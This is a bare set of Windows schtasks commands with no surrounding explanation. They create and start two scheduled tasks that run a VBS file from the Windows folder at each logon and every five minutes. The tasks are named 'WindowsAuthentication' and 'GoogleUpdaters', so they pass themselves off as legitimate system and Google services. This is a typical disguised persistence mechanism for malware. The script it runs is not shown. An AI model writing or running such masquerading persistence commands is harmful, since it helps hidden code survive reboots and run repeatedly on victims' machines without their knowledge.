schtasks /create /tn "WindowsAuthentication" /tr "C:\Windows\WindowsAuthentication.vbs" /sc onlogon
schtasks /create /tn "GoogleUpdaters" /tr "C:\Windows\WindowsAuthentication.vbs" /sc minute /mo 5
schtasks /run /tn "WindowsAuthentication"
schtasks /run /tn "GoogleUpdaters" 
"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Accessories\System Tools\Task Scheduler.lnk"